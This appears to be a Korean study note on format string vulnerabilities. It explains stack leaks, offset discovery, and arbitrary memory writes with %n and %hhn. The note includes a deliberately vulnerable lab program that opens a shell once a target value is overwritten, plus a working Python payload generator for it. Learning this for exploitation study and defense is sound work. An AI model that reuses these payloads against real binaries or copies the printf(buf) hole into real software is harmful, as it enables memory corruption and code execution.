# Format String Vulnerability

## 1. Format String Vulnerability 개요

### 정의

**Format String Vulnerability**는 `printf`, `fprintf`, `sprintf` 등 포맷 함수에 **사용자 입력을 그대로 포맷 문자열로 전달할 때** 발생한다.

```c
printf(buf);        // vulnerable
printf("%s", buf);  // safe
```

### 왜 취약한가?

- `printf`는 포맷 문자열을 **명령처럼 해석**
- `%x`, `%p`, `%s`, `%n` 등을 만나면 **가변 인자(varargs)** 를 읽으려고 시도
- 실제로는 인자를 전달하지 않았기 때문에 → **스택의 다른 값들을 인자로 착각하고 읽거나 씀**

### 결과적으로 가능한 공격

1. 스택 / libc / 바이너리 주소 leak
2. 임의 메모리 쓰기 (`%n`)
3. GOT overwrite → RCE

---

## 2. printf 동작 방식 (32-bit, cdecl)

### 인자 전달 구조

```c
printf(fmt, arg1, arg2, arg3, ...);
```

32bit cdecl 기준 스택 구조:

```
낮은 주소
[ebp+0]   : saved ebp
[ebp+4]   : return address
[ebp+8]   : fmt
[ebp+12]  : arg1
[ebp+16]  : arg2
[ebp+20]  : arg3
...
높은 주소
```

> **노트**
> 
> - `%x` 하나당 4바이트 (32bit 기준)
> - `printf`는 인자의 유효성을 검사하지 않고, fmt 이후 스택 영역을 가변 인자로 가정해 순차적으로 읽는다.



### 취약한 호출의 실제 의미

```c
printf(buf);
```

- 전달된 인자는 오직 `fmt = &buf` 하나
- `%x` 등장 시:
  - "다음 인자"가 없는데도
  - 스택에서 계속 4바이트씩 읽음

그 결과:
- return address
- libc 주소
- main의 지역 변수
- **main의 buf 내용**

까지 인자처럼 읽혀 출력됨

> **노트**
> - printf가 `buf`를 인자로 받는 것이 아니라
> - printf가 **없는 가변 인자를 읽다가**, 스택에 있던 **main의 buf 영역까지 읽게 된 것**

---

## 3. Leak과 Offset 계산

### Leak 원리

```bash
AAAA.%x.%x.%x.%x.%x.%x
```

- `%x` → “다음 인자 출력”
- 실제로는 스택의 값들이 순서대로 출력됨

출력 예:

```
AAAA.64.f7fa65c0.804918d.f7ffdb8c.1.41414141
```

- `0xf7xxxxxx` → libc
- `0x0804xxxx` → binary
- `0xffffxxxx` → stack
- `0x41414141` → 입력한 `AAAA`

> **노트**
> 
> (관례 상) 32bit Linux 환경에서
> - `0x0804xxxx` 대역은 main binary,
> - `0xf7xxxxxx` 대역은 libc 등 shared library,
> - `0xffffxxxx` 대역은 stack 영역에 매핑되는 경우가 많다.


### Offset 계산 방법

1. 마커 삽입

```bash
AAAA.%x.%x.%x.%x.%x.%x
```

2. 출력에서 `41414141` 위치 확인

3. 결론

```
offset = 6
```

의미: “printf가 6번째로 읽은 인자 슬롯에 main의 buf 내용(AAAA)이 있었다”

> **노트**
> 
> Offset의 의미 : printf가 가변 인자라고 착각하고 읽는 값들 중 내가 원하는 값이 몇 번째로 읽히는지 나타내는 것.

---

## 4. Format String Write 실습 (`%n`, `%hhn`)

### 실습 환경

```c
int target = 0xcafebabe;
char buf[100];

printf("target addr = %p\n", &target);
fgets(buf, sizeof(buf), stdin);
printf(buf);
printf("\ntarget = 0x%x\n", target);

if (target == 0xdeadbeef) {
    printf("good!\n");
    system("/bin/bash");
}
```

* 32bit
* PIE 비활성화
* Stack Canary 없음
* NX 켜짐 (쉘코드 주입 불가)
* 입력 함수: `fgets`


### 4.1 Offset 계산

입력:

```text
AAAA.%6$x
```

출력:

```text
AAAA.41414141
```

→ `AAAA`가 **printf 기준 6번째 인자 슬롯**에서 관측됨
→ `offset = 6`

> **노트 — `%6$x`란?**
>
> `%6$x`는 `printf`의 **positional parameter** 문법이다.
>
> - `6$` : 6번째 인자를 사용
> - `x`  : 해당 값을 16진수로 출력
>
> 즉, `%6$x`는  
> **“printf가 6번째 인자라고 인식한 값을 16진수로 출력하라”** 는 의미다.

### 4.2 `%n`을 이용한 기본 Write 확인

payload 구조:

```
[ &target ][ %6$n ]
```

실행 결과:

```
target = 0x4
```

- buf 앞에 위치한 `&target` 주소가
- printf에 의해 6번째 인자로 해석됨
- `%n`은 **현재까지 출력된 바이트 수(4)** 를 해당 주소에 기록



### 4.3 `%hhn`으로 1바이트씩 값 조립

#### 목표 값

```
0xdeadbeef
```

리틀엔디안 바이트 순서:

```
ef be ad de
```

#### payload 개념 구조

```
&t, &t+1, &t+2, &t+3
%pad0c %6$hhn
%pad1c %7$hhn
%pad2c %8$hhn
%pad3c %9$hhn
```

* `%c` : 출력 길이 조절
* `%hhn` : 출력된 바이트 수의 **하위 1바이트**를 기록
* pad는 **누적 출력 카운트 기준으로 계산**


### 4.4 payload 생성 코드

```python
import struct, sys

t = 0xffffce4c
base = 6
vals = [0xef, 0xbe, 0xad, 0xde]

payload  = struct.pack("<I", t)
payload += struct.pack("<I", t+1)
payload += struct.pack("<I", t+2)
payload += struct.pack("<I", t+3)

count = 16  # 주소 4개 출력

for i, v in enumerate(vals):
    pad = (v - count) % 256
    if pad:
        payload += f"%1${pad}c".encode()
        count += pad
    payload += f"%{base+i}$hhn".encode()

payload += b"\n"
sys.stdout.buffer.write(payload)
```

> **노트 — `struct.pack()`이란?**
>
> `struct.pack()`은 파이썬의 정수 값을  
> C 메모리에서 사용하는 **바이트 표현**으로 변환해준다.
>
> 예:
> ```python
> struct.pack("<I", 0xffffce4c)
> ```
>
> 의미:
> - `<` : little-endian
> - `I` : 4바이트 unsigned int
>
> 결과:
> ```
> \x4c\xce\xff\xff
> ```
>
> 이는 메모리에 실제로 저장되는 주소 값이며,  
> 포맷 스트링 공격에서 주소를 인자로 속이기 위해 필수적으로 사용된다.

### 4.5 결과

```
target = 0xdeadbeef
good!
```

- `%hhn`을 이용해 1바이트씩 조립
- 입력 길이가 길어 출력이 매우 지저분해지지만 정상 동작


> **노트**
> 
> * `buf` 크기가 작으면 `fgets`에 의해 **포맷 문자열이 중간에서 잘림**
> * 이는 오버플로우가 아니라 **입력 길이 제한 + NULL 종료** 때문
> * 처음 buf의 크기를 40으로 두었다가 fgets에 의해 포맷 문자열이 잘려 익스플로잇 실패.

